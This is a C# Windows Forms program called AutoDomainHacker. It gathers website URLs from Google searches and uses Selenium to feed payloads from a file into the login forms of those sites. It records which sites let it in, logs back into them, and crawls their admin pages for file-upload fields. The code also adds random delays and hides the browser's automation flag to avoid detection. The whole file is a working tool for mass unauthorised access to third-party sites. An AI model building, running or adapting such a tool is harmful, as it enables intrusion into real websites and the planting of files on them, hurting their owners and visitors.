using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;

namespace AutoDomainHacker
{
    public partial class Home : Form
    {
        bool isStop = false;
        Random random = new Random();
        public delegate void MyDelegate(string url, string progress);
        private void UpdateLabel(string url, string progress)
        {
            Invoke(new Action(() => {
                label10.Text = (url != "") ? url : label10.Text;
                label11.Text = (progress != "") ? progress : label11.Text;
            })); 
        }
        public Home()
        {
            InitializeComponent();
        }

        

        private async void CrawlUrls(object sender, EventArgs e)
        {          
            listView1.Items.Clear();
            label11.Text = "";
            MyDelegate myDelegate = new MyDelegate(UpdateLabel);
            
            if (textBox1.Text != "")
            {
                IWebDriver driver = (comboBox3.Text == "Google Chrome") ? (IWebDriver)CreateChromeDriver(false) : (IWebDriver)CreateFirefoxDriver(false);

                //int screenWidth = int.Parse(SystemParameters.FullPrimaryScreenWidth.ToString());
                //int screenHeight = int.Parse(SystemParameters.FullPrimaryScreenHeight.ToString());
                //driver.Manage().Window.Size = new System.Drawing.Size(screenWidth, screenHeight);
                //driver.Manage().Window.Maximize();

                string searchQuery = textBox1.Text;
                driver.Navigate().GoToUrl("https://www.google.com/search?q=" + searchQuery);
                int pages = 1;
                int noOfPages = int.Parse(comboBox1.Text);

                List<string> urls = new List<string>();
                int urlCounter = 1;
                while (pages <= noOfPages)
                {
                    if (driver.PageSource.Contains("Our systems have detected unusual traffic from your computer network"))
                    {
                        System.Windows.Forms.MessageBox.Show("Please manually resolve recaptcha and press enter");
                    }
                    var urlElements = driver.FindElements(By.ClassName("yuRUbf"));
                    foreach (var element in urlElements)
                    {
                        await Task.Run(() => {
                            string url = element.FindElement(By.TagName("a")).GetAttribute("href");
                            if(url.Contains("https:"))
                            {
                                urls.Add(url);
                                Invoke(new Action(() => {
                                    listView1.Items.Add(url);
                                }));
                                myDelegate.DynamicInvoke("", urlCounter.ToString());
                                urlCounter++;
                            }  
                        }); 
                        
                    }
                    pages++;
                    try
                    {
                        if (pages <= noOfPages)
                            driver.FindElement(By.CssSelector("#pnnext>span:nth-child(2)")).Click();
                    }
                    catch (Exception)
                    {
                        break;
                    }
                }
                driver.Dispose();
            }
        }
        private void button2_Click(object sender, EventArgs e)
        {
            if (listView1.CheckedItems.Count > 0)
            {
                foreach (ListViewItem item in listView1.CheckedItems)
                {
                    item.Remove();
                }
            }
            label11.Text = listView1.Items.Count.ToString();
        }


       
        

        private void button3_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            DialogResult result = saveFileDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
                string fileName = saveFileDialog.FileName;

                FileStream fileStream = new FileStream(fileName+".txt", FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter writer = new StreamWriter(fileStream);
                foreach (ListViewItem item in listView1.Items)
                {
                    writer.WriteLine(item.Text);
                    writer.Flush();
                    fileStream.Flush();
                }
                writer.Close();
                fileStream.Close();
            }
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
            comboBox3.SelectedIndex = 0;
            listView1.CheckBoxes = true;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            DialogResult dialogResult = openFileDialog.ShowDialog();
            if(dialogResult == DialogResult.OK)
            {
                string fileName = openFileDialog.FileName;
                label4.Text = fileName;
            }
        }
        private void button6_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            DialogResult dialogResult = openFileDialog.ShowDialog();
            if (dialogResult == DialogResult.OK)
            {
                string fileName = openFileDialog.FileName;
                label5.Text = fileName;
            }
        }


        private async void HackDomain(object sender, EventArgs e)
        {
            isStop = false;
            MyDelegate myDelegate = new MyDelegate(UpdateLabel);

            listView2.Items.Clear();
            string[] urls = File.ReadAllLines(label5.Text);
            string[] payloads = File.ReadAllLines(label4.Text);

            IWebDriver driver = (comboBox2.Text == "Google Chrome") ? (IWebDriver)CreateChromeDriver(false) : (IWebDriver)CreateFirefoxDriver(false);
     
            foreach (string url in urls)
            {
                IJavaScriptExecutor scriptExecutor = (IJavaScriptExecutor)driver;
                scriptExecutor.ExecuteScript("window.open()");
            }
            int lwCount = 0;
            int attempts = 0;
            myDelegate.DynamicInvoke("", "A: " + attempts.ToString() + "/" + urls.Length * payloads.Length + "    H: 0");
            foreach (string payload in payloads)
            {
                int counter = 0;
                foreach (string url in urls)
                {
                    if (isStop) {
                        driver.Dispose();
                        return;
                    }
                    attempts++;
                    try
                    {
                        await Task.Run(() => {

                            try
                            {
                                driver.SwitchTo().Window(driver.WindowHandles[counter]);
                                driver.Navigate().GoToUrl(url);
                            }
                            catch (Exception ex)
                            {
                                if (ex.Message.Contains("not reachable"))
                                {
                                    driver.Dispose();
                                    return;
                                }
                            }
                        });


                        //Login
                        Login(driver,url,payload);

                        try{driver.SwitchTo().Alert().Dismiss();}catch (Exception){}


                        try
                        {
                            string currentUrl = driver.Url;
                            if (!currentUrl.Contains("login.php") && !currentUrl.ToLower().Contains("error"))
                            {
                                string domain = currentUrl.Substring(8,10);
                                bool isAlreadyExist = false;
                                foreach(ListViewItem item in listView2.Items)
                                {
                                    if(item.SubItems[0].Text.Contains(domain))
                                    {
                                        listView2.Items[item.Index].SubItems[1].Text += "|"+payload;                                           
                                        isAlreadyExist = true;
                                    }
                                }
                                if(!isAlreadyExist)
                                {
                                    listView2.Items.Add(url);
                                    listView2.Items[lwCount].SubItems.Add(payload);
                                    lwCount++;
                                }
                            }
                        }
                        catch (Exception) { }

                        myDelegate.DynamicInvoke(url, "A: "+attempts.ToString()+"/"+urls.Length*payloads.Length+"    H: " + listView2.Items.Count.ToString());
                    
                    }
                    catch (Exception) { continue; }
                    counter++;
                }
            }
            driver.Dispose();
        }
        public void KillProcesses()
        {
            Process[] driverProcesses = Process.GetProcessesByName("chrome");
            Process[] firefoxDriverProcesses = Process.GetProcessesByName("firefox");
            foreach (var driverProcess in driverProcesses)
            {
                driverProcess.Kill();
            }
            foreach (var firefoxDriverProcess in firefoxDriverProcesses)
            {
                firefoxDriverProcess.Kill();
            }
        }

        private void button7_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            DialogResult result = saveFileDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
                string fileName = saveFileDialog.FileName;

                FileStream fileStream = new FileStream(fileName + ".txt", FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter writer = new StreamWriter(fileStream);
                foreach (ListViewItem item in listView2.Items)
                {
                    writer.WriteLine(item.Text+"|"+item.SubItems[1].Text);
                    writer.Flush();
                    fileStream.Flush();
                }
                writer.Close();
                fileStream.Close();
            }
        }

        private void button9_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            DialogResult dialogResult = openFileDialog.ShowDialog();
            if (dialogResult == DialogResult.OK)
            {
                string fileName = openFileDialog.FileName;
                label8.Text = fileName;
            }
        }

        private async void FindUploadPoints(object sender, EventArgs e)
        {
            isStop = false;
            await Task.Run(() => {
                IWebDriver chromeDriver = CreateChromeDriver(false);
                IWebDriver firefoxDriver = CreateFirefoxDriver(false);

                //chromeDriver.Manage().Window.Size = new System.Drawing.Size(100, 200);
                //chromeDriver.Manage().Window.Position = new System.Drawing.Point(0,0);
                //int screenWidth = int.Parse(SystemParameters.FullPrimaryScreenWidth.ToString());
                //firefoxDriver.Manage().Window.Position = new System.Drawing.Point(0, screenWidth - 200);
                //chromeDriver.Manage().Window.Size = new System.Drawing.Size(100, 200);

                Invoke(new Action(() => listView3.Items.Clear())); 

                string[] domains = File.ReadAllText(label8.Text).Trim().Split('\n');
                int listCounter = 0;
                MyDelegate myDelegate = new MyDelegate(UpdateLabel);

                foreach (string data in domains)
                {
                    if (isStop)
                    {
                        chromeDriver.Dispose();
                        firefoxDriver.Dispose();
                        return;
                    }
                    string[] line = data.Split(new String[] { "|" }, 2, StringSplitOptions.None);
                    Uri uri = new Uri(line[0].Trim());
                    string domain = uri.Scheme + "://" + uri.Host;
                    string loginUrl = line[0].Trim();
                    string payload = line[1].Trim().Split('|')[0];

                    Login(chromeDriver, loginUrl, payload);
                    Login(firefoxDriver, loginUrl, payload);

                    List<string> urls = FindAllUrls(chromeDriver, domain);
                    Invoke(new Action(() => {
                        listView3.Items.Add(domain);
                        listView3.Items[listCounter].SubItems.Add(urls.Count.ToString());
                    }));

                    //Find upload point from all urls
                    int urlCounter = 0;
                    foreach (string url in urls)
                    {
                        if (isStop)
                        {
                            chromeDriver.Dispose();
                            firefoxDriver.Dispose();    
                            return;
                        }
                        Thread.Sleep(random.Next(5, 50) * 100);
                        myDelegate.DynamicInvoke(url, (urlCounter + 1).ToString() + "/" + urls.Count.ToString());
                        if (urlCounter % 2 == 0)
                        {
                            //chrome
                            try
                            {                             
                                chromeDriver.Navigate().GoToUrl(url);
                                IWebElement webElement = chromeDriver.FindElement(By.CssSelector("input[type = file]"));
                                Invoke(new Action(() => listView3.Items[listCounter].SubItems.Add(url))); 
                                urlCounter++;
                            }
                            catch (Exception)
                            {
                                urlCounter++;
                                continue;
                            }
                        }
                        else
                        {
                            //firefox
                            try
                            {
                                firefoxDriver.Navigate().GoToUrl(url);
                                IWebElement webElement = firefoxDriver.FindElement(By.CssSelector("input[type = file]"));
                                Invoke(new Action(() => listView3.Items[listCounter].SubItems.Add(url)));
                                urlCounter++;
                            }
                            catch (Exception)
                            {
                                urlCounter++;
                                continue;
                            }
                        }
                    }
                    listCounter++;
                }

                chromeDriver.Dispose();
                firefoxDriver.Dispose();
            });   
        }    

        private void Login(IWebDriver driver, string loginUrl, string payload)
        {
            driver.Navigate().GoToUrl(loginUrl);
            //USER ID/EMAIL/USERNAME
            try
            {
                var element = driver.FindElements(By.CssSelector("input"));
                int i = 0;
                foreach (var item in element)
                {
                    string type = item.GetAttribute("type");
                    if (type == "text" || type == "username" || type == "email")
                    {
                        if (element[i + 1].GetAttribute("type") == "password")
                        {
                            item.SendKeys(payload);
                            goto PASSWORD;
                        }
                    }
                    i++;
                }
            }
            catch (Exception) { }

        //PASSWORD
        PASSWORD:
            driver.FindElement(By.CssSelector("input[type = password]")).Clear();
            driver.FindElement(By.CssSelector("input[type = password]")).SendKeys(payload);

            Thread.Sleep(700);

            //SUBMIT/BUTTON
            try
            {
                var elements = driver.FindElements(By.CssSelector("input"));
                int i = 0;
                foreach (var item in elements)
                {
                    try
                    {
                        string type = item.GetAttribute("type");
                        if (type == "submit" || type == "button")
                        {
                            if (elements[i - 1].GetAttribute("type") == "password")
                            {
                                item.Click();
                            }
                            if (elements[i - 1].GetAttribute("type") == "checkbox" && elements[i - 2].GetAttribute("type") == "password")
                            {
                                item.Click();
                            }
                        }
                    }
                    catch (Exception)
                    {
                        continue;
                    }
                    i++;
                }
            }
            catch (Exception)
            {
                goto SUBMIT2;
            }

        SUBMIT2:
            try
            {
                var elements = driver.FindElements(By.CssSelector("button"));
                elements[elements.Count - 1].Click();

            }
            catch (Exception) { }
        }
        private List<string> FindAllUrls(IWebDriver driver, string domain)
        {
            //Find all admin urls
            List<string> urls = new List<string>();
            var links = driver.FindElements(By.TagName("a"));
            foreach (var link in links)
            {
                var href = link.GetAttribute("href");
                if (href != domain && !href.Contains("logout") && !href.Contains("signout") && !href.Contains("login"))
                {
                    urls.Add(href);
                }
            }
            return urls;
        }





        public ChromeDriver CreateChromeDriver(bool hideBrowser)
        {
            ChromeOptions options = new ChromeOptions();
            if (hideBrowser)
            {
                options.AddArgument("--headless");
            }
            options.AddArgument("--no-sandbox");
            options.AddExcludedArgument("enable-automation");
            //options.AddAdditionalCapability("useAutomationExtension", false);
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            service.HideCommandPromptWindow = true;
            //TimeSpan.FromSeconds is the max time for request to timeout
            ChromeDriver driver = new ChromeDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
            driver.Manage().Timeouts().PageLoad.Add(TimeSpan.FromSeconds(random.Next(10, 20)));
            //int screenWidth = int.Parse(SystemParameters.FullPrimaryScreenWidth.ToString());
            //driver.Manage().Window.Size = new System.Drawing.Size(screenWidth, 100);
            //driver.Manage().Window.Position = new System.Drawing.Point(0, 0);
            if (hideBrowser)
            {
                driver.Manage().Window.Minimize();
            }
            else
            {
                driver.Manage().Window.Maximize();
            }
            return driver;
        }
        public FirefoxDriver CreateFirefoxDriver(bool hideBrowser)
        {
            FirefoxOptions options = new FirefoxOptions();
            if (hideBrowser)
            {
                options.AddArgument("--headless");  
            }
            options.AddArgument("--no-sandbox");
            FirefoxDriverService service = FirefoxDriverService.CreateDefaultService();
            service.HideCommandPromptWindow = true;
            FirefoxDriver driver = new FirefoxDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
            driver.Manage().Timeouts().PageLoad.Add(TimeSpan.FromSeconds(random.Next(10, 20)));
            //int screenWidth = int.Parse(SystemParameters.FullPrimaryScreenWidth.ToString());
            //driver.Manage().Window.Size = new System.Drawing.Size(screenWidth, 100);
            //int screenHeight = int.Parse(SystemParameters.FullPrimaryScreenHeight.ToString());
            //driver.Manage().Window.Position = new System.Drawing.Point(0, screenHeight-80);
            if (hideBrowser)
            {
                driver.Manage().Window.Minimize();
            }
            else
            {
                driver.Manage().Window.Maximize();
            }
            return driver;
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            label10.Text = "";
            label11.Text = "";
        }

        private void Stop(object sender, EventArgs e)
        {
            isStop = true;
        }

        
    }
}
